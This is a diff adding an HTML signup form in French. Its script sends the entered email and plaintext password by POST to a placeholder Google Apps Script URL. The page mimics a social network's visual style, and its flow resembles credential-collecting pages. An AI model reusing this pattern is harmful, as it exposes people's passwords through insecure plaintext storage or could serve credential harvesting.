@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire d'Inscription</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            width: 400px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #007bdb;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Inscription</h1>
+    <form id="loginForm" onsubmit="sendData(event)">
+        <input type="email" id="email" placeholder="Email" required>
+        <input type="password" id="password" placeholder="Mot de passe" required>
+        <button type="submit">S'inscrire</button>
+    </form>
+</div>
+
+<script>
+    async function sendData(event) {
+        event.preventDefault(); // Empêche le rechargement de la page
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Remplacez par l'URL de votre script Google Apps Web App
+        const scriptURL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec'; // MODIFIER ICI !
+
+        const formData = new URLSearchParams();
+        formData.append('email', email);
+        formData.append('password', password);
+
+        try {
+            const response = await fetch(scriptURL, {
+                method: 'POST',
+                body: formData,
+            });
+            if (response.ok) {
+                alert('Utilisateur ajouté avec succès !');
+                document.getElementById('loginForm').reset(); // Réinitialiser le formulaire
+            } else {
+                alert('Erreur lors de l\'ajout de l\'utilisateur.');
+            }
+        } catch (error) {
+            alert('Erreur lors de l\'envoi des données.');
+            console.error('Erreur:', error);
+        }
+    }
+</script>
+
+</body>
+</html>
